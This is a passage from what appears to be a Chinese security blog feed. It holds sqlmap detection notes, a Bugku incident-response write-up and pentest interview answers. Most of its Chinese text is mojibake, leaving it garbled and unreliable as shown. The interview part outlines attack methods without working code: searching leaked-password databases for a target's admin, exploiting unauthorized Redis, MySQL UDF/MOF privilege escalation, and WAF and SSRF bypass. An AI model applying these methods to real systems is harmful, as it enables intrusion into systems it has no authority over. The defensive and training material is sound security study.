è¯·æ±‚ï¼Œå¦‚æœç»“æœä¸åŸé¡µé¢ç›¸åŒå°±åˆ¤æ–­ä¸å­˜åœ¨å¸ƒå°”æ³¨å…¥</span><br><span class="line">å¦‚æœä¸ç›¸åŒå‘é€ä¸€ä¸ª true è¯·æ±‚,å¦‚æœä¸åŸé¡µé¢ç›¸ä¼¼</span><br><span class="line">åˆ™å†å‘é€ä¸€ä¸ª false è¯·æ±‚ï¼Œç„¶åæŠŠè¿™ä¸¤æ¬¡è¿”å›çš„ç»“æœå–å·®é›†ï¼Œè®¡ç®—å‡ºTrueæ—¶çš„flagæ ‡è¯†ï¼Œä¹Ÿå°±æ˜¯sqlmapçš„-stringå‚æ•°</span><br></pre></td></tr></table></figure><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘é€æŠ¥é”™payloadï¼Œå¦‚æœèƒ½å¤Ÿæ­£åˆ™åŒ¹é…åˆ°åˆ™è¯´æ˜å­˜åœ¨æŠ¥é”™æ³¨å…¥ã€‚</span><br></pre></td></tr></table></figure><p>å»¶æ—¶æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…ˆå‘é€Nä¸ªæ­£å¸¸è¯·æ±‚ï¼Œç„¶åè®¡ç®—è¿™Nä¸ªè¯·æ±‚å“åº”æ—¶é—´çš„æ ‡å‡†å·®å’Œæ­£å¸¸è¯·æ±‚çš„æœ€é•¿å“åº”æ—¶é—´</span><br><span class="line">ç„¶åå‘é€ä¸€ä¸ªå»¶æ—¶è¯·æ±‚ï¼Œåˆ¤æ–­æ˜¯å¦åœ¨åŒºé—´å†…</span><br></pre></td></tr></table></figure><p>è”åˆæŸ¥è¯¢æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨order byå’ŒäºŒåˆ†æ³•æ¥åˆ¤æ–­åˆ—æ•°</span><br><span class="line">éå†åˆ—æ•°åˆ¤æ–­å“ªä¸€åˆ—æ˜¯å›æ˜¾ç‚¹</span><br><span class="line">å‘é€payload</span><br></pre></td></tr></table></figure></li><li><p><a href="https://www.beysec.com/security/sqlmap-source-1.html">sqlmapæºç åˆ†æä¸å­¦ä¹ </a></p></li><li><p><a href="https://www.processon.com/view/5835511ce4b0620292bd7285">sqlmap æµç¨‹è„‘å›¾</a></p></li></ul><p>os-shell åŸç†</p><ul><li><a href="https://xz.aliyun.com/t/7942">sqlmap â€“os-shellåŸç†</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&mid=2247485339&idx=1&sn=ea76ee0d56b8a95a118a60d111d48160">Sqlmapä¹‹os-shellåŸç†åˆ†æ</a></li></ul><p>æ”»é˜²</p><ul><li><a href="https://xz.aliyun.com/t/10385">å®æˆ˜sqlmapç»•è¿‡WAF</a></li><li><a href="https://www.anquanke.com/post/id/261915">sqlmap â€“os-shellååˆ¶å°æ€è·¯</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247494179&idx=1&sn=e6c94b87981fda009e7be50c9eb73bf6">å…¥ä¾µæ£€æµ‹ä¹‹sqlmapæ¶æ„æµé‡åˆ†æ</a></li></ul><h2 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h2><ul><li><p>æ­£ç¡®ä½¿ç”¨é¢„ç¼–è¯‘+é»‘åå•</p></li><li><p>é…ç½®é—®é¢˜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  ç«™åº“åˆ†ç¦»</span><br><span class="line">  ä¸å…è®¸å¤–è¿</span><br><span class="line">  æ•°æ®åº“ä»¥ä½æƒé™è¿è¡Œ</span><br><span class="line">  ä¸æ˜¾ç¤ºæŠ¥é”™</span><br><span class="line">  ä¸ä½¿ç”¨å¤šè¯­å¥æŸ¥è¯¢</span><br><span class="line">  secure_file_priv=NULL</span><br><span class="line">å­—ç¬¦é›†ä¿æŒä¸€è‡´</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bugku åº”æ€¥å“åº”</title>
      <link href="/2023/05/31/bugku%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2023/05/31/bugku%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h3 id="jsåŠ«æŒ"><a href="#jsåŠ«æŒ" class="headerlink" title="jsåŠ«æŒ"></a>jsåŠ«æŒ</h3><p><img src="/../images/image-20230402174621652-1686151030355.png" alt="image-20230402174621652"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `find /var/www/html -name &quot;6127418cad73c.php&quot;`</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230402174633296-1686151030358.png" alt="image-20230402174633296"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . | xargs grep -ri &#x27;&lt;script type=&quot;text/javascript&quot;&gt;&#x27; -l | sort | uniq -c</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€šè¿‡xssçš„ç‰¹å¾å†…å®¹æ¥å®šä½å¯ç–‘æ–‡ä»¶</p><h3 id="åå¼¹shellåé—¨"><a href="#åå¼¹shellåé—¨" class="headerlink" title="åå¼¹shellåé—¨"></a>åå¼¹shellåé—¨</h3><p><img src="/../images/image-20230402180138838-1686151030359.png" alt="image-20230402180138838"></p><p><img src="/../images/image-20230402180201438-1686151030359.png" alt="image-20230402180201438"></p><p>å¤„ç†ï¼š</p><p>åˆ é™¤æ–‡ä»¶</p><p>æ€æ‰è¿›ç¨‹</p><h3 id="å‘½ä»¤åŠ«æŒ"><a href="#å‘½ä»¤åŠ«æŒ" class="headerlink" title="å‘½ä»¤åŠ«æŒ"></a>å‘½ä»¤åŠ«æŒ</h3><p><img src="/../images/image-20230402180338299-1686151030359.png" alt="image-20230402180338299"></p><h3 id="æ•°æ®åº“ä¿®å¤"><a href="#æ•°æ®åº“ä¿®å¤" class="headerlink" title="æ•°æ®åº“ä¿®å¤"></a>æ•°æ®åº“ä¿®å¤</h3><p><a href="https://www.cnblogs.com/richardzhu/p/3318595.html">MySQLä¹‹æƒé™ç®¡ç† - Iâ€™m Me! - åšå®¢å›­</a></p><p><img src="/../images/image-20230402181706798-1686151030359.png" alt="image-20230402181706798"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">revoke file on *.* from &#x27;root&#x27;@&#x27;localhost&#x27;; # æ”¶å›æ–‡ä»¶æƒé™</span><br><span class="line">set global general_log = off; # ä¸å¯ç”¨æ—¥å¿—</span><br><span class="line">flush privileges; # åˆ·æ–°æƒé™</span><br></pre></td></tr></table></figure><h3 id="ç”¨æˆ·åˆ é™¤"><a href="#ç”¨æˆ·åˆ é™¤" class="headerlink" title="ç”¨æˆ·åˆ é™¤"></a>ç”¨æˆ·åˆ é™¤</h3><p><img src="/../images/image-20230402183352852-1686151030359.png" alt="image-20230402183352852"></p><p>ç›´æ¥åˆ å°±å®Œäº‹äº†</p><h3 id="é¦–æ¬¡æ”»å‡»"><a href="#é¦–æ¬¡æ”»å‡»" class="headerlink" title="é¦–æ¬¡æ”»å‡»"></a>é¦–æ¬¡æ”»å‡»</h3><p>ç­›é€‰äº†ipå’ŒçŠ¶æ€ç ï¼Œç„¶åæ‰¾çš„ã€‚</p><p><img src="/../images/image-20230402190333789-1686151030360.png" alt="image-20230402190333789"></p><p><img src="/../images/image-20230403114840046-1686151030360.png" alt="image-20230403114840046"></p><p><img src="/../images/image-20230403114851126-1686151030360.png" alt="image-20230403114851126"></p><p>å‘ç°å®‰è£…äº†phpmyadminï¼Œé‚£ä¹ˆå¾ˆå¤§æ¦‚ç‡æ˜¯é€šè¿‡æ•°æ®åº“æ”»å…¥çš„ã€‚</p><p><img src="/../images/image-20230403115435870-1686151030360.png" alt="image-20230403115435870"></p><p>ç™»å½•phpmyadminåå°æŸ¥çœ‹äºŒè¿›åˆ¶æ—¥å¿—ï¼Œå¾ˆæ˜æ˜¾çœ‹å‡ºæ¥è¿™ä¸ªæ˜¯ä½¿ç”¨udfåˆ›å»ºæ¶æ„å‡½æ•°sys_evalææƒ</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># æŸ¥çœ‹è¿™äº›ç›®å½•æ˜¯å¦æœ‰æ–‡ä»¶ï¼Œå¾ˆå¯èƒ½æœ‰ææƒ</span><br><span class="line">mysql\lib\plugin</span><br><span class="line"></span><br><span class="line">c:<span class="operator">/</span>windows<span class="operator">/</span>system32<span class="operator">/</span>wbem<span class="operator">/</span>mof<span class="operator">/</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230403115606245-1686151030360.png" alt="image-20230403115606245"></p><p>ä¿®å¤</p><p><img src="/../images/image-20230403123447079-1686151030360.png" alt="image-20230403123447079"></p><p>åœ¨my.iniä¸­æ·»åŠ å¦‚ä¸Šè®¾ç½®ï¼Œä¸å…è®¸å¯¼å…¥å’Œå¯¼å‡ºã€‚</p><p>è¿›è¡Œmysqlæ—¥å¿—åˆ†æï¼Œé€šè¿‡å®šä½sys_evalæ¥æŸ¥æ‰¾æ”»å‡»è€…è¿›è¡Œäº†å“ªäº›æ“ä½œ</p><p><img src="/../images/image-20230403120034903-1686151030360.png" alt="image-20230403120034903"></p><p>åªè¿›è¡Œäº†æ·»åŠ ç”¨æˆ·çš„æ“ä½œ</p><p><img src="/../images/image-20230403120253606-1686151030360.png" alt="image-20230403120253606"></p><p>ç›´æ¥åˆ é™¤è¯¥ç”¨æˆ·</p><p><img src="/../images/image-20230403120327311-1686151030360.png" alt="image-20230403120327311"></p><p>æŸ¥æ€websehll</p><p>ä½¿ç”¨æ—¥å¿—åˆ†æå·¥å…·</p><p>ï¼ˆè·Ÿè¸ªipçš„è®¿é—®ï¼‰</p><p><img src="/../images/image-20230403122636304-1686151030360.png" alt="image-20230403122636304"></p><p><img src="/../images/image-20230403122604222-1686151030360.png" alt="image-20230403122604222"></p><p>åé—¨æŸ¥æ€</p><p><img src="/../images/image-20230403124818101-1686151030361.png" alt="image-20230403124818101"></p><p><img src="/../images/image-20230403124754804-1686151030361.png" alt="image-20230403124754804"></p><p>æœ¨é©¬ä½ç½®åœ¨å¯åŠ¨é¡¹</p><p><img src="/../images/image-20230403124903028-1686151030361.png" alt="image-20230403124903028"></p><p><img src="/../images/image-20230403124408821-1686151030361.png" alt="image-20230403124408821"></p><p>é€šè¿‡èµ„æºç›‘è§†å™¨å¾—åˆ°è¯¥æœ¨é©¬å¤–è”åœ°å€</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é¢ç»</title>
      <link href="/2023/05/31/%E9%9D%A2%E7%BB%8F/"/>
      <url>/2023/05/31/%E9%9D%A2%E7%BB%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><ul><li>åœ¨æ¸—é€è¿‡ç¨‹ä¸­ï¼Œæ”¶é›†ç›®æ ‡ç«™æ³¨å†Œäººé‚®ç®±å¯¹æˆ‘ä»¬æœ‰ä»€ä¹ˆä»·å€¼ï¼Ÿ</li></ul><p>(1)ä¸¢ç¤¾å·¥åº“é‡Œçœ‹çœ‹æœ‰æ²¡æœ‰æ³„éœ²å¯†ç ï¼Œç„¶åå°è¯•ç”¨æ³„éœ²çš„å¯†ç è¿›è¡Œç™»å½•åå°</p><p>(2)ç”¨é‚®ç®±åšå…³é”®è¯è¿›è¡Œä¸¢è¿›æœç´¢å¼•æ“</p><p>(3)åˆ©ç”¨æœç´¢åˆ°çš„å…³è”ä¿¡æ¯æ‰¾å‡ºå…¶ä»–é‚®ç®±è¿›è€Œå¾—åˆ°å¸¸ç”¨ç¤¾äº¤è´¦å·</p><p>(4)ç¤¾å·¥æ‰¾å‡ºç¤¾äº¤è´¦å·ï¼Œé‡Œé¢æˆ–è®¸ä¼šæ‰¾å‡ºç®¡ç†å‘˜è®¾ç½®å¯†ç çš„ä¹ æƒ¯</p><p>(5)åˆ©ç”¨å·²æœ‰ä¿¡æ¯ç”Ÿæˆä¸“ç”¨å­—å…¸</p><p>(6)è§‚å¯Ÿç®¡ç†å‘˜å¸¸é€›å“ªäº›éå¤§ä¼—æ€§ç½‘ç«™ï¼Œæ‹¿ä¸‹å®ƒï¼Œä½ ä¼šå¾—åˆ°æ›´å¤šå¥½ä¸œè¥¿</p><ul><li><p>ä¿¡æ¯æ”¶é›†å¦‚ä½•å¤„ç†å­åŸŸåçˆ†ç ´çš„æ³›è§£æé—®é¢˜ï¼Ÿ</p><p><img src="/../images/image-20230616165230965.png" alt="image-20230616165230965"></p></li><li><p>å¦‚ä½•ç»•è¿‡CDNæ‰¾åˆ°çœŸå®IPï¼Œè¯·åˆ—ä¸¾äº”ç§æ–¹æ³• (â˜…â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å›½å¤–pingï¼Œå› ä¸ºå¤§å¤šæ•°ä¼ä¸šä¸ä¼šåœ¨å›½å¤–æ­è®¾CDN</span><br><span class="line">DNSè§£æè®°å½•ï¼Œå¯ä»¥æ‰¾æœªæ­è®¾CDNæ—¶çš„ip</span><br><span class="line">äºŒçº§åŸŸåæ³•ï¼Œå› ä¸ºå¯èƒ½åªç»™ä¸»ç«™æ­è®¾äº†CDN</span><br><span class="line">å†å²åŸŸåæ³•ï¼Œä¸ä½¿ç”¨çš„æ—§åŸŸåé€šå¸¸ä¸ä¼šæœ‰CDNï¼Œå¹¶ä¸”æ²¡æœ‰è¿‡æœŸçš„è¯å°±å¯ä»¥</span><br><span class="line">é‚®ç®±æ³•ï¼Œé‚®ç®±æœåŠ¡å™¨çœŸå®ip</span><br></pre></td></tr></table></figure></li><li><p>redisæœªæˆæƒè®¿é—®å¦‚ä½•åˆ©ç”¨ï¼Œåˆ©ç”¨çš„å‰ææ¡ä»¶æ˜¯? (â˜…â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç»å¯¹è·¯å¾„å†™å…¥webshell</span><br><span class="line">sshå…¬é’¥ï¼šéœ€è¦å­˜åœ¨.sshç›®å½•</span><br><span class="line">crontabå®šæ—¶ä»»åŠ¡ï¼šä½ç‰ˆæœ¬redisï¼ˆæ‰ä¼šæ˜¯rootæƒé™ï¼‰ï¼Œç³»ç»Ÿä¸ºCentosï¼ˆå› ä¸ºrediså†™æ–‡ä»¶644ï¼Œubuntuè¦æ‰§è¡Œå®šæ—¶ä»»åŠ¡å¿…é¡»600ï¼‰</span><br><span class="line"></span><br><span class="line">ä¸»ä»å¤åˆ¶ï¼šæ˜¯æŒ‡å°†ä¸€å°RedisæœåŠ¡å™¨çš„æ•°æ®ï¼Œå¤åˆ¶åˆ°å…¶ä»–çš„RedisæœåŠ¡å™¨ã€‚å‰è€…ç§°ä¸ºä¸»èŠ‚ç‚¹(master)ï¼Œåè€…ç§°ä¸ºä»èŠ‚ç‚¹(slave)ï¼›æ•°æ®çš„å¤åˆ¶æ˜¯å•å‘çš„ï¼Œåªèƒ½ç”±ä¸»èŠ‚ç‚¹åˆ°ä»èŠ‚ç‚¹ã€‚</span><br><span class="line">é€šè¿‡åŒæ­¥åŠŸèƒ½ï¼Œå°†æ¶æ„osæ–‡ä»¶å¤åˆ¶åˆ°ä»èŠ‚ç‚¹è¾¾åˆ°RCE</span><br></pre></td></tr></table></figure></li><li><p>mysqlææƒæ–¹å¼æœ‰å“ªäº›?åˆ©ç”¨æ¡ä»¶æ˜¯ä»€ä¹ˆ? (â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mof : windows server 2003 mofè„šæœ¬è¢«ç³»ç»Ÿå®šæ—¶æ‰§è¡Œï¼Œå†™å…¥æ¶æ„vbsè„šæœ¬</span><br><span class="line">udf ï¼š ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œå¯¼å…¥æ¶æ„dllä»è€ŒRCE</span><br><span class="line">Mysqlç‰ˆæœ¬å¤§äº5.1ç‰ˆæœ¬udf.dllæ–‡ä»¶å¿…é¡»æ”¾ç½®äºMYSQLå®‰è£…ç›®å½•ä¸‹çš„lib\pluginæ–‡ä»¶å¤¹ä¸‹ã€‚</span><br><span class="line">Mysqlç‰ˆæœ¬å°äº5.1ç‰ˆæœ¬ã€‚udf.dllæ–‡ä»¶åœ¨Windows2003ä¸‹æ”¾ç½®äºc:\windows\system32ï¼Œåœ¨windows2000ä¸‹æ”¾ç½®äºc:\winnt\system32ã€‚</span><br><span class="line"></span><br><span class="line">å¯åŠ¨é¡¹ææƒ</span><br><span class="line">åå¼¹shell</span><br></pre></td></tr></table></figure></li><li><p>windows+mysqlï¼Œå­˜åœ¨sqlæ³¨å…¥ï¼Œä½†æ˜¯æœºå™¨æ— å¤–ç½‘æƒé™ï¼Œå¯ä»¥åˆ©ç”¨å—? (â˜…)</p></li><li><p>å¸¸ç”¨çš„ä¿¡æ¯æ”¶é›†æ‰‹æ®µæœ‰å“ªäº›ï¼Œé™¤å»<code>è·¯å¾„æ‰«æ</code>ï¼Œ<code>å­åŸŸåçˆ†ç ´</code>ç­‰å¸¸è§æ‰‹æ®µï¼Œæœ‰ä»€ä¹ˆçŒ¥ççš„æ–¹æ³•æ”¶é›†ä¼ä¸šä¿¡æ¯? (â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è§æ¸—é€æµ‹è¯•æµç¨‹</span><br></pre></td></tr></table></figure></li><li><p><code>SRCæŒ–æ˜</code>ä¸<code>æ¸—é€æµ‹è¯•</code>çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Œé’ˆå¯¹è¿™ä¸¤ä¸ªä¸åŒçš„ç›®æ ‡ï¼Œå®æ–½è¿‡ç¨‹ä¸­ä¼šæœ‰ä»€ä¹ˆåŒºåˆ« (â˜…â˜…)</p><p><img src="/../images/image-20230404125508806-1686810531409.png" alt="image-20230404125508806"></p></li><li><p>å­˜å‚¨xssåœ¨çº¯å†…ç½‘çš„ç¯å¢ƒä¸­ï¼Œå¯ä»¥æ€ä¹ˆåˆ©ç”¨ï¼Ÿ(â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xssæœ¬è´¨ä¸Šæ˜¯ä»»æ„jsä»£ç æ‰§è¡Œï¼Œxsså¯ä»¥ä¿®æ”¹ç½‘ç«™é¡µé¢ï¼Œç”šè‡³å¯ä»¥æ‰«æç«¯å£ï¼Œå¦‚æœä½ ä¹Ÿåœ¨å†…ç½‘ï¼Œå¯ä»¥å—…æ¢å¯†ç ç­‰ç­‰ã€‚</span><br></pre></td></tr></table></figure></li><li><p>mssqlä¸­ï¼Œå‡è®¾ä¸ºsaæƒé™ï¼Œå¦‚ä½•ä¸é€šè¿‡<code>xp_cmdshell</code>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ (â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sp_oacreate</span><br><span class="line">CLR</span><br></pre></td></tr></table></figure></li><li><p>å‡è®¾æŸç½‘ç«™å­˜åœ¨wafï¼Œä¸è€ƒè™‘æ­£é¢ç»•è¿‡çš„å‰æä¸‹ï¼Œåº”è¯¥å¦‚ä½•ç»•è¿‡(åˆ†æƒ…å†µè®¨è®º äº‘waf&#x2F;ç‰©ç†waf) (â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">äº‘wafï¼Œç»•è¿‡åŸŸåè§£æï¼Œæ‰¾åˆ°çœŸå®ipï¼›</span><br><span class="line"></span><br><span class="line">ç‰©ç†wafï¼Œå‰åç«¯è§£æä¸ä¸€è‡´å¦‚ç¼–ç ç»•è¿‡ï¼Œå¤šæ•°æ®æ¥æºç»•è¿‡ï¼Œå‚æ•°æ±¡æŸ“ï¼Œhttpåè®®ç»•è¿‡å¦‚åˆ†å—ä¼ è¾“.ç•¸å½¢è¯·æ±‚æ–¹å¼ï¼Œé•¿è¿æ¥ï¼Œchrestç¼–ç ï¼Œwafæ€§èƒ½å¦‚è„æ•°æ®ï¼Œé«˜å¹¶å‘ï¼Œwafæœºåˆ¶å¦‚ç™½åå•ç»•è¿‡ï¼Œé™æ€æ–‡ä»¶ç»•è¿‡</span><br></pre></td></tr></table></figure></li></ul><h2 id="Webå®‰å…¨ç›¸å…³"><a href="#Webå®‰å…¨ç›¸å…³" class="headerlink" title="Webå®‰å…¨ç›¸å…³"></a>Webå®‰å…¨ç›¸å…³</h2><ul><li><p>ä»‹ç»ä¸€ä¸‹è‡ªè®¤ä¸ºæœ‰è¶£çš„æŒ–æ´ç»å†ï¼ˆæˆ–CTFç»å†ï¼‰(â˜…â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssrf+redis</span><br><span class="line"></span><br><span class="line">æ‰“å¼€ç½‘ç«™æ˜¯ä¸€ä¸ªç¿»è¯‘ç•Œé¢ï¼Œurlè¿‡æ»¤ä¸å……åˆ†ï¼Œdict,fileç­‰åè®®éƒ½è¿‡æ»¤äº†ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤httpåè®®ã€‚ç›´æ¥ç”¨burpçš„intruderæ¨¡å—çˆ†ç ´ä»¥ä¸‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªä¸»æœºå­˜æ´»ï¼Œç„¶åå†å¯¹è¿™ä¸ªä¸»æœºè¿›è¡Œç«¯å£æ‰«æï¼Œ6379ç«¯å£å¼€æ”¾ã€‚redisæœåŠ¡éœ€è¦è®¤è¯ï¼Œçˆ†ç ´è„šæœ¬ï¼Œéœ€è¦å…ˆäº†è§£redisçš„é€šä¿¡åè®®ï¼Œå°†æ•°æ®åŒ…æ„é€ æˆredisèƒ½ç†è§£çš„åè®®ã€‚</span><br><span class="line"></span><br><span class="line">php sessionååºåˆ—åŒ–ï¼Œé€šè¿‡åˆ‡æ¢php sessionåºåˆ—åŒ–æ¨¡å¼ï¼Œä»è€Œå¯¼è‡´ååºåˆ—åŒ–getshell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">src</span><br><span class="line"></span><br><span class="line">å…ˆä¿¡æ¯æ”¶é›†ï¼Œç”¨fofaçš„è¯ä¹¦è¯­æ³•certæœç´¢åˆ°ç½‘ç«™ï¼Œæ˜¯ä¸€ä¸ªå•†åŸç³»ç»Ÿï¼Œç„¶åæµ‹è¯•äº†ä¸€ä¸‹æœç´¢æ¡†ï¼ŒåŠ å…¥å¼•å·ï¼Œå‘ç°å‡ºç°äº†æŠ¥é”™ï¼Œç„¶åæƒ³ç”¨xpathå‡½æ•°æ¥è¿›è¡Œæ³¨å…¥ï¼Œå‘ç°å‡½æ•°è¢«è¿‡æ»¤äº†ï¼Œçœ‹é‚£ä¸ªç½‘ç«™å›æ˜¾åº”è¯¥æ˜¯å®‰å…¨ç‹—ï¼Œç„¶åfuzzäº†ä¸€ä¸‹ï¼Œå‘ç°ä¸èƒ½å‡ºç°æ‹¬å·è¿˜æœ‰select fromè¿ç”¨ï¼Œç”¨å†…è”æ³¨é‡Šï¼Œæ’å…¥è„å­—ç¬¦å’Œæ¢è¡Œ+æ³¨é‡Šç»•è¿‡äº†ï¼Œå°±å†™äº†ä¸ªtamperè„šæœ¬å¼€è·‘ã€‚ç„¶åæ”¶é›†äº†ä¿¡æ¯ï¼Œå‘ç°è¿™ä¸ªæ˜¯ç½‘ç«™å’Œæ•°æ®åº“éƒ½åœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œå¹¶ä¸”sec_file_revä¸ºç©ºï¼Œæ‰€ä»¥å°±å¯ä»¥å°è¯•å†™shellï¼Œä½†æ˜¯ä¸çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼Œé€šè¿‡è¯»å–apacheçš„é…ç½®æ–‡ä»¶å¾—åˆ°äº†ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼Œå°±å¯ä»¥å†™å…¥äº†ï¼Œåˆ°è¿™å°±æ²¡æœ‰ç»§ç»­æµ‹è¯•äº†ã€‚</span><br></pre></td></tr></table></figure></li><li><p>CSRFçš„æˆå› åŠé˜²å¾¡æªæ–½ï¼ˆä¸ç”¨tokenå¦‚ä½•è§£å†³) (â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æˆå› ï¼šwebåº”ç”¨ç¨‹åºåœ¨ç”¨æˆ·è¿›è¡Œæ•æ„Ÿæ“ä½œæ—¶ï¼Œæ²¡æœ‰è¿›è¡Œèº«ä»½éªŒè¯</span><br><span class="line">é˜²å¾¡æªæ–½ï¼š</span><br><span class="line">- è®¾ç½®Token</span><br><span class="line">- æ£€éªŒ refereræ¥æº</span><br><span class="line">- åŠ å…¥éªŒè¯ç ç­‰</span><br></pre></td></tr></table></figure></li><li><p>CSRFæ¼æ´ä¸­jsonpè·Ÿcorsçš„è·¨åŸŸåŒºåˆ«ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jsonpåªæ”¯æŒgetæ–¹å¼çš„è·¨åŸŸæ–¹å¼</span><br><span class="line">corsæ”¯æŒgetå’Œpostè¯·æ±‚æ–¹å¼</span><br></pre></td></tr></table></figure></li><li><p>SSRFçš„æˆå› åŠé˜²å¾¡æªæ–½ (â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æˆå› ï¼šå¯¹äºè¯·æ±‚çš„urlæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å’Œé™åˆ¶ ,å¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„url </span><br><span class="line">é˜²å¾¡æªæ–½ï¼šç¦æ­¢è·³è½¬ï¼Œå¯¹è¿œç¨‹æœåŠ¡å™¨çš„å“åº”åšä¸¥æ ¼çš„è¿‡æ»¤å’Œé™åˆ¶ï¼Œç™½åå•ï¼šè¯·æ±‚çš„ipåœ°å€å’Œç«¯å£</span><br></pre></td></tr></table></figure></li><li><p>SSRFå¦‚ä½•æ¢æµ‹éHTTPåè®®(â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯ä»¥ä½¿ç”¨gopherï¼Œdictï¼Œcurlï¼Œfileç­‰åè®®</span><br></pre></td></tr></table></figure></li><li><p>ç®€è¿°ä¸€ä¸‹SSRFçš„ç»•è¿‡æ‰‹æ³•(â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚çš„urlä¸Š</span><br><span class="line">-127.0.0.1å˜å½¢</span><br><span class="line">-å­—ç¬¦æ¬ºéª—</span><br><span class="line">-DNSRebind</span><br><span class="line">-@#ç»•è¿‡ï¼Œurlè§£æ</span><br></pre></td></tr></table></figure></li><li><p>ç®€è¿°ä¸€ä¸‹SSRFä¸­DNSRebindçš„ç»•è¿‡åŸç†åŠä¿®å¤æ–¹æ³•(â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸŸåè§£æçš„aè®°å½•æœ‰ä¸¤ä¸ªï¼Œå°±å¯ä»¥è§£æåˆ°127.0.0.1</span><br><span class="line"></span><br><span class="line">ä¿®å¤æ–¹æ³•ï¼š</span><br><span class="line">é…ç½®æœ¬åœ°DNSæœåŠ¡å™¨ï¼Œé¿å…ä½¿ç”¨å…¬å…±DNSæœåŠ¡å™¨</span><br><span class="line">å¢å¼ºè®¤è¯æˆæƒæœºåˆ¶,è®¿é—®æ—¶éœ€è¦å…¶ä»–è®¤è¯</span><br></pre></td></tr></table></figure></li><li><p>ä»‹ç» SQL æ³¨å…¥æ¼æ´æˆå› ï¼Œå¦‚ä½•é˜²èŒƒï¼Ÿæ³¨å…¥æ–¹å¼æœ‰å“ªäº›ï¼Ÿé™¤äº†æ‹–å–æ•°æ®åº“æ•°æ®ï¼Œåˆ©ç”¨æ–¹å¼è¿˜æœ‰å“ªäº›ï¼Ÿ(â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æˆå› ï¼šæœåŠ¡å™¨å°†ç”¨æˆ·æäº¤çš„å‚æ•°é”™è¯¯åœ°æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼Œæ‰“ç ´äº†æ•°æ®åŒºåŸŸçš„è¾¹ç•Œï¼ˆæ•°å­—å‹ä¸éœ€è¦ï¼‰æ”¹å˜äº†åŸæœ‰çš„sqlæ‰§è¡Œé€»è¾‘ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ‰§è¡Œæ¶æ„çš„sqlè¯­å¥ã€‚</span><br><span class="line"></span><br><span class="line">é˜²èŒƒï¼šé¢„ç¼–è¯‘ï¼ˆåŠ äº†å•å¼•å·ï¼Œå­—æ®µåâ†’å­—ç¬¦ä¸²ï¼‰+ç™½åå•</span><br><span class="line"></span><br><span class="line">æ³¨å…¥æ–¹å¼ï¼šè”åˆï¼ŒæŠ¥é”™ï¼Œå †å ï¼Œæ—¶é—´ç›²æ³¨ï¼Œå¸ƒå°”ç›²æ³¨ï¼Œorder by</span><br><span class="line"></span><br><span class="line">å…¶ä»–ï¼š</span><br><span class="line">è¯»å†™æ–‡ä»¶ ï¼ˆå˜é‡å€¼ï¼Œç‰©ç†è·¯å¾„ï¼Œæƒé™ï¼‰</span><br><span 